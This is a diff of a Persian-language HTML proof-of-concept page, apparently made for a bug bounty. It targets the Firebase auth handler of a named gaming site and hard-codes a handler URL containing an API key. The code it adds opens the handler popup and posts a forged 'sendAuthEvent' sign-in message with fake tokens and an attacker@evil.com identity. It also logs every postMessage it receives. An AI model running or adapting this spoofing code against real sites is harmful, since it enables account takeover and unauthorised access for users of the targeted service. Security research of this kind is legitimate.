@@ -2,80 +2,91 @@
 <html lang="fa">
 <head>
   <meta charset="UTF-8">
-  <title>Firebase Handler PostMessage Tester</title>
+  <title>Firebase PostMessage PoC - Bug Bounty</title>
   <style>
-    body { font-family: Arial; padding: 20px; direction: rtl; }
-    pre { background: #f4f4f4; padding: 15px; border-radius: 8px; }
+    body { font-family: Arial; padding: 20px; background: #111; color: #0f0; direction: rtl; }
+    button { padding: 12px 20px; font-size: 16px; margin: 10px; }
+    pre { background: #222; padding: 15px; border-radius: 8px; max-height: 400px; overflow-y: auto; }
   </style>
 </head>
 <body>
 
-  <h2>Firebase Auth Handler PostMessage Tester</h2>
-  <input type="text" id="handlerUrl" placeholder="Firebase Handler URL" style="width: 80%; padding: 10px;" />
-  <br><br>
-  <button onclick="openPopup()">باز کردن Popup</button>
+  <h2>Firebase Auth Handler PostMessage PoC</h2>
+  <p>سایت هدف: <b>https://www.cloudgaming002.com</b></p>
 
-  <h3>دریافتی‌ها:</h3>
+  <input type="text" id="handlerUrl" value="https://iam.cldbt.cloud/__/auth/handler?apiKey=AIzaSyBno_U0VgS_Pl1ayb41cqKNL5wFtB5zLio&appName=%5BDEFAULT%5D&authType=signInViaPopup&redirectUrl=https%3A%2F%2Fwww.cloudgaming002.com%2Fen%2Fauth%2Fsign-in&v=12.12.0&eventId=7530990138&providerId=google.com&scopes=profile%2Chttps%3A%2F%2Fwww.googleapis.com%2Fauth%2Fuserinfo.email" style="width: 90%; padding: 10px;" />
+  <br><br>
+
+  <button onclick="openHandlerPopup()">1. باز کردن Popup Handler</button>
+  <button onclick="sendFakeAuthEvent()">2. ارسال پیام جعلی (sendAuthEvent)</button>
+
+  <h3>لاگ دریافتی‌ها:</h3>
   <pre id="log"></pre>
 
   <script>
     const logEl = document.getElementById('log');
-
-    function log(message) {
-      const time = new Date().toLocaleTimeString('fa-IR');
-      logEl.innerHTML += `<b>[${time}]</b> ${message}<br>`;
-      console.log(message);
-    }
-
     let popup = null;
 
-    function openPopup() {
-      const url = document.getElementById('handlerUrl').value.trim();
-      
-      if (!url) {
-        alert("لطفاً URL handler رو وارد کن");
-        return;
-      }
-
-      log("در حال باز کردن popup...");
-
-      popup = window.open(
-        url,
-        "firebasePopup",
-        "width=650,height=700,scrollbars=yes"
-      );
-
-      if (!popup) {
-        log("❌ Popup مسدود شد! لطفاً پاپ‌آپ بلاکر رو خاموش کن.");
-      }
+    function log(msg) {
+      const time = new Date().toLocaleTimeString('fa-IR');
+      logEl.innerHTML += `<b>[${time}]</b> ${msg}<br>`;
+      console.log(msg);
     }
 
-    // گوش دادن به همه پیام‌ها
-    window.addEventListener('message', function(event) {
-      log(`📨 پیام دریافتی از: <b>${event.origin}</b>`);
+    function openHandlerPopup() {
+      const url = document.getElementById('handlerUrl').value;
+      popup = window.open(url, "firebasePopup", "width=700,height=750,scrollbars=yes,resizable=yes");
+      log("🔄 Popup Handler باز شد");
+    }
 
-      console.log("Full Event:", event);
-      console.log("Data:", event.data);
+    // دریافت همه پیام‌ها
+    window.addEventListener('message', function(e) {
+      log(`📨 پیام از: <b>${e.origin}</b>`);
+      log(`نوع: <b>${e.data?.eventType || 'نامشخص'}</b>`);
 
-      log(`نوع رویداد: <b>${event.data?.eventType || 'نامشخص'}</b>`);
-
-      if (event.data && event.data.eventType) {
-        log(`✅ eventType = ${event.data.eventType}`);
-        
-        if (event.data.data) {
-          log(`داده: ${JSON.stringify(event.data.data, null, 2)}`);
+      if (e.data) {
+        console.dir(e.data);
+        if (e.data.eventType === "sendAuthEvent") {
+          log("🔥 <b>sendAuthEvent دریافت شد!</b>");
+          log("داده: " + JSON.stringify(e.data.data, null, 2));
         }
-      } else {
-        log(`داده خام: ${JSON.stringify(event.data)}`);
-      }
-
-      // اگر پیام sendAuthEvent بود، جزئیات بیشتری نشان بده
-      if (event.data?.eventType === "sendAuthEvent") {
-        log("🔥 <b>sendAuthEvent دریافت شد!</b>");
       }
     });
 
-    // چک کردن اینکه popup بسته شد
+    // ارسال پیام جعلی
+    function sendFakeAuthEvent() {
+      if (!popup || popup.closed) {
+        alert("ابتدا Popup را باز کنید!");
+        return;
+      }
+
+      const fakeData = {
+        eventType: "sendAuthEvent",
+        eventId: "7530990138",
+        data: {
+          operationType: "signIn",
+          credential: {
+            providerId: "google.com",
+            accessToken: "fake_token_123456",
+            idToken: "fake_id_token"
+          },
+          user: {
+            uid: "fake_uid_123",
+            email: "attacker@evil.com",
+            displayName: "Hacked User"
+          },
+          additionalUserInfo: {
+            providerId: "google.com",
+            isNewUser: false
+          }
+        }
+      };
+
+      popup.postMessage(fakeData, "*");   // targetOrigin = *
+      log("🚀 پیام جعلی sendAuthEvent ارسال شد!");
+    }
+
+    // چک کردن بسته شدن popup
     setInterval(() => {
       if (popup && popup.closed) {
         log("Popup بسته شد.");
